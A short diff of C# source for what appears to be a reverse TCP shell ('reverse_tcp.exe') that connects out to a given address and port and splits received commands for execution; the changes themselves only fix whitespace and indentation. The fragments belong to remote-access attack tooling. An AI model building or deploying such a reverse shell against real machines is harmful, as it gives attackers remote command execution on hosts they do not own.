@@ -1,4 +1,4 @@
-//When running place arguments like so ./reverse_tcp.exe 127.0.0.1 4444 
+//When running place arguments like so ./reverse_tcp.exe 127.0.0.1 4444
 
 public static void Main (string[] args) {
   using (TcpClient client = new TcpClient (args [0], int.Parse (args [1])))
@@ -15,7 +15,7 @@ public static void Main (string[] args) {
             return;
           }
           if (string.IsNullOrWhiteSpace(cmd))
-          continue;
+            continue;
 
           string[] split = cmd.Trim().Split(' ');
           string filename = split.First();
